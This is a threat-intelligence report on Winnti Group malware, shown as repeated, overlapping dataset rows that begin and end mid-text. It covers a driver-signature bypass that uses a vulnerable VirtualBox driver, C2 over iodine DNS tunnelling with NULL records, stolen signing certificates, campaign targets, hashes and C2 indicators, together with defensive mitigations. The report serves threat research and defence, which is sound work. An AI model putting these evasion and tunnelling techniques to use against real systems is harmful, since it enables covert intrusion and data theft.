DNS\_TYPE\_NULL ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-7-300x136.png) Finally, from [Windows’s documentation](https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants), DNS\_TYPE\_NULL is actually a Windows constant equal to 0xa ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-8-274x300.png) ### Winnti Signed Code With Digital Certificate from IQ Technology During our analysis of the Winnti sample configured to target the German chemical company, our comparative analysis of other Winnti related drivers revealed a digital certificate issued to *IQ Technology*, a Taiwanese company producing Natural language processing (NLP) and Artificial Intelligence (AI) software. The rootkit driver aligns with the already known driver1.sys*.* While it is a known TTP that Winnti attributed attacks have involved stolen digital certificates for code signing its malware components, the use of this certificate is not publicly discussed, except for a brief report from a security researcher apparently associated with a Vietnamese security company. Although the report is no longer online, the discussed [sample](https://hybrid-analysis.com/sample/a5d6139921576c3aedfc64e2b37ae1a64f3160bd1bb70d4fc7fce956029e7d55?environmentId=2&lang=en) contains a compilation timestamp of August 2015, which is the earliest one observed in the wild that we identified using this digital certificate. At the time of analysis, the digital certificate was already revoked. The sample’s structure, debug symbols, and explanatory debug messages included within suggests it is highly likely be a development version. Additionally, the compilation timestamp indicates the sample was created 20 minutes prior to the *driver1.sys.* Both samples are highly related, and its contents combined with the date of analysis and reporting essentially solidify that it existed in 2015; however, this does not necessarily corroborate to an attack timeframe. ### Sample Targeting South Korean Gaming Company | **HASHES** | **Compilation Timestamp** | | **MD5:** 00961922e22e6a5d30b1d6fbd667d3c4 **SHA1**: 0fd54c26b593bd9e9218492d50d8873521c0ec0d **SHA256:** 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 | 2016-03-07 09:44:01 | *Table 3 – observed network IoCs in Winnti sample* On 21 February, we detected the new submission of a 64-bit Winnti executable to a public online malware scanning service. As multiple researchers have reported, Winnti operators embed the name of their target directly into the malware, but in an obfuscated manner. **Binary Analysis** The sample resembles the Winnti Dropper Install.exe described by ESET, since it is a command line executable used to drop and load additional encrypted payload: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/rundl.png) Unfortunately we were not able to find the payload meant to be decrypted by this dropper. However, we were able to extract the malware’s configuration file and identify the intended target. In this case, the following string was included within the extracted configuration: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/gravity.png) Based on previous knowledge and targeting of the Winnti Group, we assess that this sample was likely used to target Gravity Co., Ltd., a South Korean video game company. The company is known for its Massive Multiplayer Online Role Playing Game (MMORPG) [*Ragnarok Online*](http://www.gravity.co.kr/en/games/), which is also offered as a mobile application. As we have also reported in the past, the video game industry is one of the preferred targets of the Winnti Group, especially for those companies operating in South Korea and Taiwan. Interestingly, ESET researchers, while reporting on multiple Winnti Group campaigns targeting the video game industry, listed in their report a C2 server having a Campaign ID ***GRA** KR 0629*. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-9.png) *Excerpt from ESET Research White paper “*[*CONNECTING THE DOTS Exposing the arsenal and methods of the Winnti Group*](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf)*”* At this time, we do not have any further evidence supporting a potential link between the sample we analysed and the C2 detailed by ESET, but the coincidence between the C2 Campaign ID/Location with the Campaign ID we extracted from the Winnti dropper is worth noting. ### Conclusion The Winnti Group has exhibited their ability to breach different organizations and conduct sophisticated attack operations, typically motivated by espionage and financial gain, with various TTPs and malware toolkits. While attribution is not concrete due to the complexity of the group, there are links that can be drawn between operations which suggest the threat actors purporting the attacks are likely operating within the Winnti Group, or at least sharing resources. The detection of this unreported Winnti variant uploaded to VirusTotal and targeting a German chemical company aligns with our prior observations and research from [previous intelligence reporting](https://web.br.de/interaktiv/winnti/index.html)highlighting Winnti Group’s interest in German DAX companies. As a result, organizations of all sizes, but especially small to medium sized companies, including Germany’s *hidden champions*, should prepare against such threats as they are vital to the economic ecosystem and continuous development of niche markets. Government oversight (local, regional, and across the EU) should ensure susceptible organizations such as these are following regulation and implementing security best practices to protect against future attacks. Appendix -------- ### Indicators of Compromise 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c *.dick[.]mooo[.]com 208[.]67[.]222[.]222 45[.]248[.]85[.]200 ### MITRE ATT&CK | **Tactic** | **Technique** | **Recommended Course of Action** | | Persistence / Privilege Escalation | [T1215](https://attack.mitre.org/techniques/T1215/) Kernel Modules and Extensions [T1068](https://attack.mitre.org/techniques/T1068/) Exploitation for Privilege Escalation | Anti-Virus software and Advanced End-Point solution can drastically reduce the risk of both techniques. | | Defense Evasion | [T1009](https://attack.mitre.org/techniques/T1009/) Binary Padding [T1014](https://attack.mitre.org/techniques/T1014/) Rootkit [T1116](https://attack.mitre.org/techniques/T1116/) Code Signing | Many of the samples analysed were signed with expired / revoked certificate. Enforce signature validation via Group Policies for executables | | Exfiltration | [T1022](https://attack.mitre.org/techniques/T1022/) Data Encrypted [T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol | – For DNS Tunnel, ensure that DNS logs are collected and reviewed. – DNS telemetic data should be also collected in order to spot frequent and heavy loaded DNS communication that are definitely not related to an usual DNS query. – FreeDNS and DynDNS servers should be blacklisted/synkholed if not strictly required – DNS NULL type queries should not be avoided. Only the required record types should be allowed. | * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"") Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. MessageSubscribe"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2020-04-20_winnti-group-insights-from-the.txt,quoteintelligence_2020-04-20_winnti-group-insights-from-the,G0044,"WINNTI GROUP: Insights From the Past Apr 20, 2020 Newly uncovered DNS tunnelling technique, and new campaign against South Korean gaming company ---------------------------------------------------------------------------------------------- ### Executive Summary * In January 2020, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. As part of our responsible disclosure, we alerted the affected entity, the local Law Enforcements, and our clients. * In the following weeks after our internal reporting, the German news media source Tagesschau [reported](https://www.tagesschau.de/investigativ/ndr/hackerangriff-chemieunternehmen-101.html) our initial detection and analysis of the sample, and confirmed the chemical company’s awareness of the attack in the second half of 2019. * The Winnti sample we analysed was highly likely developed in 2015, and likely used around this year for the first time, it is unclear how long the compromise existed in the compromised environment. * Although the malware was likely used years ago, further analysis revealed a previously unreported C2 technique never attributed to any Winnti Group’s toolkits. * The technique relies on a DNS Tunneling communication channel through a custom implementation of the [iodine source code](https://github.com/yarrick/iodine), an open-source software that enables the tunneling of IPv4 data through a DNS server. * Additionally, we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti-related attack components, and the targeting of a previously-unreported South Korean video game company. * The sophistication of the techniques we uncovered confirms that the Winnti Group is a highly sophisticated, and highly committed Advanced Persistent Group targeting a plethora of different industry sectors in Europe and South Asia. ### Introduction The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. The suspected state-sponsor link to China’s government pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. On Friday, 13 January, QuoIntelligence (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. Additionally, during our analysis we uncovered a previously unknown stolen digital certificate being used to digitally sign Winnti related drivers, and a potential campaign against an already known South Korean video game company. In the last year, researchers and journalists have publicly disclosed that the Winnti group targeted and eventually compromised Henkel (2014), BASF (2015), Bayer (2018) and Roche (2019). This most recent previously unreported German chemical company is yet another German chemical company targeted by Winnti since 2015. Prior to our analysis this attack activity was not publicly reported. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-1-1.png) *Figure 1: Timeline of attacks located in Germany and attributed to Winnti* In December 2019, Germany’s Federal Office for the Protection of the Constitution (BfV) released a [report](https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf) related to the alleged Chinese state sponsored umbrella organization known as the Winnti Group. Through our internal malware analysis, we are confident that the sample we discovered is highly similar to the Winnti sample described in the BfV report. The sample also matches known characteristics of Winnti’s arsenal shared through intelligence reports produced by [ESET](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf). Further, we have informed the affected company, law enforcement agencies, and sent a Warning to our customers upon detection. ### The Winnti Group The Winnti Group (also known as APT41, BARIUM, and Blackfly) is an alleged Chinese state-sponsored umbrella organization in China’s intelligence branch linked through their use of shared goals and attack resources. Notably, various operations attributed to other China-linked threat actor groups, such as APT17 and Ke3chang, have also leveraged its backdoor malware. Active since at least 2010, initial attacks attributed to the group heavily targeted the gaming industry. However, as researchers have continued to follow and dissect the group and its activity, the group’s target focus has expanded to other industries, including chemical, pharmaceutical, technology, and software. Further, the group’s evolution involves the enhancement, development, and inclusion of new tools and tactics. The suspected state-sponsor link to China’s government, pinpoints that it likely has an incentive to continue targeting a variety of industries, especially one’s highlighted as priority for China’s economic development. In the latest Winnti Group public report, FireEye researchers [reported](https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html) of a new widespread campaign attributed to APT41 which involves exploitation attempts of recently disclosed and patched vulnerabilities for products of Cisco, Citrix, and Zoho. The campaign waves apparently take a more targeted approach to selecting potential victims across various sectors including financials, government, and information technology. According to the researchers, identified victim systems demonstrated the threat actor leveraged commercially available post exploitation tools such as Cobalt Strike and Meterpreter, which are essentially full featured backdoors. Technical Analysis ------------------ ### Sample Targeting German Chemical Company The main artifact uploaded to VirusTotal is a Dynamic Link Library (DLL) file, with a compilation timestamp suggesting the sample was built in August 2015. Although the compilation time might be legitimate, it is not possible to determine when and how long the attackers used this malware. | **HASHES** | **Compilation** **Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | *Table 1 – Winnti sample* ### Binary Analysis Similar to other Winnti samples, the configuration section contains a string referring to the name of the campaign. In this case, at 0X020, the referred campaign name is the name of the chemical company – redacted for the purposes of this blog. *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-X-1.png)* *Figure 2 – Extracted configuration from Winnti sample* The analysed artifact we observed contains the following binaries listed below, and also aligns with observations in the BfV report. | **HASHES** | **Compilation Timestamp** | **Filename** | | **MD5:** c893a12ff72698f09f89f778e4c9cd2b **SHA1**: 06256946a69409cd18859bfa429184a282374d76 **SHA256:** df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c | 2015-08-06 01:52:51 | TmPfwRVS.dll | | **MD5**: cf140dc4cad9e8216545593a4c08c7be **SHA1**: 2b319b44451abb0596b9187e06f1fb7b4ace969d **SHA256**: bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 | 2015-08-05 12:08:00 | driver1.sys | | **MD5**: cc95391d75ce2443740f60114fe30ae9 **SHA1**: 30d1dd1dd4f0ace7a4f2c24e31fb6a0ee33e8a3a **SHA256**: 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf | 2015-05-05 11:31:13 | driver2.sys | | **MD5**: b4e66b445b39d0368bbe4b91a3cd98ff **SHA1**: 2bc358ddc72f59ba0373b8635ab08ad747c12180 **SHA256**: 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 | 2014-12-15 16:06:41 | dsefix.exe | | **MD5**: eaea9ccb40c82af8f3867cd0f4dd5e9d **SHA1**: 7c1b25518dee1e30b5a6eaa1ea8e4a3780c24d0c **SHA256**: cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 | 2008-May-31 02:18:53 UTC | vboxdrv.sys | *Table 2 – Additional artifacts contained by bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860* **Analysis of dsefix.exe** This is essentially [Windows x64 Driver Signature Enforcement Overrider](https://github.com/hfiref0x/DSEFix) (DSEFix), used to temporarily disable the driver signature enforcement on Windows systems by using an included old, legit VirtualBox driver, both signed and exploitable. By running dsefix.exe, the malware can bypass driver verification and install its own drivers. We identified the following two drivers which were embedded in the earlier described main artifact. To note that this technique does not work on moden Windows (e.g. Windows 10) – yet another piece of evidence that this malware was designed and used multiple years ago. **Analysis of vboxdriver** This is the vulnerable, correctly signed with a digital certificate, VirtualBox driver that is used for exploitation. It is used regularly by various threat actors, and by the previously highlighted dsefix.exe*.* The driver can also be used to perform the Turla Driver Loader (TDL) exploitation [technique](https://github.com/hfiref0x/TDL), a similar technique as DSEFix. **Analysis of driver1.sys** In late 2019, [ExaTrack](https://exatrack.com/public/winnti_EN.pdf)released their analysis of a signed Winnti rootkit previously observed in the wild, which we confirm is essentially the same rootkit driver. The sample is capable of injecting raw packets into the network and receiving special formatted packets. In comparison, our variant has the same exact number of bytes, and there are large parts exactly matching. **Analysis of driver2.sys** This rootkit driver seems to be largely the same as driver1.sys with the same characteristics including structure, I/O control, and device strings. However, this driver supports different versions of Windows. It checks for ranges of Windows New Technology (NT) build numbers and returns early. ### C2 DNS Tunneling By analyzing the malware, it is possible to find two network indicators within its code: ``` ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-2-1024x82.png) ``` *Figure 3 – observed network IoCs in Winnti sample* The hardcoded 208.67.222.222 is a legitimate OpenDNS DNS server (resolver1.opendns.com). This IP is pushed into a list that is generated by the malware at runtime. Likely, the initiation routine also populates the list with the system’s DNS, and the OpenDNS server is only used as fallback case to ensure the C2 domain gets resolved. The dick[.]mooo[.]com FQDN name is offered by [FreeDNS](https://freedns.afraid.org/), which is a free dynamic DNS service. Notably, in the last years, multiple researchers have reported Winnti/PlugX C2 hostnames hosted in the mooo[.]com zone. In the code we observed that a dot (.) is enforced before the FQDN*.* Additional analysis revealed that the malware generates subdomains with base128 encoding, and append them to FQDN. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Figure-y.png) *Code 1 – Hostname length restriction* Further, dots are added into it every 57 characters potentially as a hostname length restriction, suggesting the expectation of long hostnames. We confirm the buffer can support FQDN’s up to 2000 characters. Upon further investigation we found out that the malware includes the open source [iodine source code](https://github.com/yarrick/iodine) – software that enables the tunneling of IPv4 data through a DNS server. Interestingly, we are not aware of any earlier documentation highlighting Winnti specifically leveraging iodine for DNS tunneling. However, researchers at the Ruhr University Bochum, while hunting for DNS tunnels, [observed](https://www.farsightsecurity.com/assets/documents/A_Study_of_Newly_Observed_Hostnames_and_DNS_Tunneling_in_the_Wild.pdf) APT32 and Wekby APT groups using NULL and TXT records as a C2 communication channel, as well as mentioning the mooo[.]com top level domain in their findings. The implementation of iodine used in the Winnti sample is integrated and uses some custom wrapper, as evidence by the matching functions we discuss in further detail in the following section. **Use of Iodine for C2 DNS Tunneling** The iodine DNS tunneling solution is embedded in the DLL that is initially loaded and executed in memory, and includes at least the following 15 matching functions: *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Table-3.png)* *Table 3 – Malware DLL Functions* For instance, the 64bit executable contains the build\_hostname function (Code 2), which corresponds with the older 32bit version (compiled with debug symbols) of iodine 0.6.0 (Code 3): ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code_2.png) *Code 2- iodine\_0-6-0\_build\_hostname* ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code-3.png) *Code 3- iodine\_0-6-0\_build\_hostname* Based on the presence of the functions base128\_blksize\_enc and base128\_blksize\_raw, we determined the version used, while not exactly known, is from before May 2017 when a patch removed those functions. Further, comparative analysis indicates that for the implementation of iodine in this Winnti attack operation, there is no perfect match for the two versions having 64bit pre-compiled binaries. This indicates iodine was compiled from source, and it is reasonable it is being used as a library, and not in its normal distribution format of a standalone executable. The DNS Tunneling technique adopted by the malware through the use of iodine is detailed in the figure below. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-3.png) *Figure 4 – C2 channel over DNS* 1.The malware generates a hostname and appends it to the embedded C2 dick[.]mooo[.]com, and makes a NULL query to the resulted FQDN (e.g. abcde is appended to .dick[.]mooo[.]com). Notably, NULL and TXT DNS request types are iodine’s preferred channels since they are “[*expected to provide the largest downstream bandwidth*](https://github.com/yarrick/iodine)”. It is hence not a coincidence that researchers at Ruhr University Bochum also observed an extensive use of NULL request types for DNS Tunneling purposes in their research. 2.The infected host sends the DNS query to one of the DNS servers included in the list populated at runtime, eventually to the OpenDNS fallback server. At this point the DNS server executes a recursive DNS query by contacting the Name Servers (NS) of each zone, until the Authoritative NS of dick[.]mooo[.]com is obtained. To note, FreeDNS does provide users the capability to delegate the authority of their subdomains to external NS. In the described scenario, attackers delegated the NS of their subdomain to use their NS as a de-facto C2 server. 3.The DNS server returns the authoritative answer by forwarding the content of the NULL record type to the infected host. Notably, the legit DNS server acts as a proxy between the infected host and the malicious server, by making impossible for defenders the application of any filtering at the Network (L3) level. **The NULL DNS record type** The implementation of NULL type tunneling can be observed in the following excerpt taken while reversing the malware: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-2.png) The third argument when calling dns\_encode shall be of the type “struct query” from Iodine’s [dns.c](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/dns.c#L232) ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-4.png) According to [common.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/common.h#L86), “struct query” is defined as: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-6-300x192.png) Since QUERY\_NAME\_SIZE equals to 512 (4 *128 – integers are 4 bytes) the query[128] call obtained from the reversing activity is indeed the DNS query type. As noted, reversing activity detailed the query[128] value to be 0xa. From Iodine’s [windows.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/windows.h#L39) T\_NULL is DNS\_TYPE\_NULL ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-7-300x136.png) Finally, from [Windows’s documentation](https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants), DNS\_TYPE\_NULL is actually a Windows constant equal to 0xa ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-8-274x300.png) ### Winnti Signed Code With Digital Certificate from IQ Technology During our analysis of the Winnti sample configured to target the German chemical company, our comparative analysis of other Winnti related drivers revealed a digital certificate issued to *IQ Technology*, a Taiwanese company producing Natural language processing (NLP) and Artificial Intelligence (AI) software. The rootkit driver aligns with the already known driver1.sys*.* While it is a known TTP that Winnti attributed attacks have involved stolen digital certificates for code signing its malware components, the use of this certificate is not publicly discussed, except for a brief report from a security researcher apparently associated with a Vietnamese security company. Although the report is no longer online, the discussed [sample](https://hybrid-analysis.com/sample/a5d6139921576c3aedfc64e2b37ae1a64f3160bd1bb70d4fc7fce956029e7d55?environmentId=2&lang=en) contains a compilation timestamp of August 2015, which is the earliest one observed in the wild that we identified using this digital certificate. At the time of analysis, the digital certificate was already revoked. The sample’s structure, debug symbols, and explanatory debug messages included within suggests it is highly likely be a development version. Additionally, the compilation timestamp indicates the sample was created 20 minutes prior to the *driver1.sys.* Both samples are highly related, and its contents combined with the date of analysis and reporting essentially solidify that it existed in 2015; however, this does not necessarily corroborate to an attack timeframe. ### Sample Targeting South Korean Gaming Company | **HASHES** | **Compilation Timestamp** | | **MD5:** 00961922e22e6a5d30b1d6fbd667d3c4 **SHA1**: 0fd54c26b593bd9e9218492d50d8873521c0ec0d **SHA256:** 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 | 2016-03-07 09:44:01 | *Table 3 – observed network IoCs in Winnti sample* On 21 February, we detected the new submission of a 64-bit Winnti executable to a public online malware scanning service. As multiple researchers have reported, Winnti operators embed the name of their target directly into the malware, but in an obfuscated manner. **Binary Analysis** The sample resembles the Winnti Dropper Install.exe described by ESET, since it is a command line executable used to drop and load additional encrypted payload: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/rundl.png) Unfortunately we were not able to find the payload meant to be decrypted by this dropper. However, we were able to extract the malware’s configuration file and identify the intended target. In this case, the following string was included within the extracted configuration: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/gravity.png) Based on previous knowledge and targeting of the Winnti Group, we assess that this sample was likely used to target Gravity Co., Ltd., a South Korean video game company. The company is known for its Massive Multiplayer Online Role Playing Game (MMORPG) [*Ragnarok Online*](http://www.gravity.co.kr/en/games/), which is also offered as a mobile application. As we have also reported in the past, the video game industry is one of the preferred targets of the Winnti Group, especially for those companies operating in South Korea and Taiwan. Interestingly, ESET researchers, while reporting on multiple Winnti Group campaigns targeting the video game industry, listed in their report a C2 server having a Campaign ID ***GRA** KR 0629*. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-9.png) *Excerpt from ESET Research White paper “*[*CONNECTING THE DOTS Exposing the arsenal and methods of the Winnti Group*](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf)*”* At this time, we do not have any further evidence supporting a potential link between the sample we analysed and the C2 detailed by ESET, but the coincidence between the C2 Campaign ID/Location with the Campaign ID we extracted from the Winnti dropper is worth noting. ### Conclusion The Winnti Group has exhibited their ability to breach different organizations and conduct sophisticated attack operations, typically motivated by espionage and financial gain, with various TTPs and malware toolkits. While attribution is not concrete due to the complexity of the group, there are links that can be drawn between operations which suggest the threat actors purporting the attacks are likely operating within the Winnti Group, or at least sharing resources. The detection of this unreported Winnti variant uploaded to VirusTotal and targeting a German chemical company aligns with our prior observations and research from [previous intelligence reporting](https://web.br.de/interaktiv/winnti/index.html)highlighting Winnti Group’s interest in German DAX companies. As a result, organizations of all sizes, but especially small to medium sized companies, including Germany’s *hidden champions*, should prepare against such threats as they are vital to the economic ecosystem and continuous development of niche markets. Government oversight (local, regional, and across the EU) should ensure susceptible organizations such as these are following regulation and implementing security best practices to protect against future attacks. Appendix -------- ### Indicators of Compromise 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c *.dick[.]mooo[.]com 208[.]67[.]222[.]222 45[.]248[.]85[.]200 ### MITRE ATT&CK | **Tactic** | **Technique** | **Recommended Course of Action** | | Persistence / Privilege Escalation | [T1215](https://attack.mitre.org/techniques/T1215/) Kernel Modules and Extensions [T1068](https://attack.mitre.org/techniques/T1068/) Exploitation for Privilege Escalation | Anti-Virus software and Advanced End-Point solution can drastically reduce the risk of both techniques. | | Defense Evasion | [T1009](https://attack.mitre.org/techniques/T1009/) Binary Padding [T1014](https://attack.mitre.org/techniques/T1014/) Rootkit [T1116](https://attack.mitre.org/techniques/T1116/) Code Signing | Many of the samples analysed were signed with expired / revoked certificate. Enforce signature validation via Group Policies for executables | | Exfiltration | [T1022](https://attack.mitre.org/techniques/T1022/) Data Encrypted [T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol | – For DNS Tunnel, ensure that DNS logs are collected and reviewed. – DNS telemetic data should be also collected in order to spot frequent and heavy loaded DNS communication that are definitely not related to an usual DNS query. – FreeDNS and DynDNS servers should be blacklisted/synkholed if not strictly required – DNS NULL type queries should not be avoided. Only the required record types should be allowed. | * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"") Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. MessageSubscribe"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2020-04-20_winnti-group-insights-from-the.txt,quoteintelligence_2020-04-20_winnti-group-insights-from-the,G0050,"WINNTI GROUP: Insights From the Past Apr 20, 2020 Newly uncovered DNS tunnelling technique, and new campaign against South Korean gaming company ---------------------------------------------------------------------------------------------- ### Executive Summary * In January 2020, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) detected a new Winnti sample uploaded to a public virus scanner from a German location. Following our preliminary analysis, we assessed with high confidence that the sample was used to target a previously unreported German chemical company. As part of our responsible disclosure, we alerted the affected entity, the local Law Enforcements, and our clients. * In the following weeks after our internal reporting, the German news media source Tagesschau [reported](https://www.tagesschau.de/investigativ/ndr/hackerangriff-chemieunternehmen-101.html) our initial detection and analysis of the sample, and confirmed the chemical company’s awareness of the attack in the second half of 2019. * The Winnti sample we analysed was highly likely developed in 2015, and likely used around this year for the first time, it is unclear how long the compromise existed in the compromised environment. * Although the malware was likely used years ago, further analysis revealed a previously unreported C2 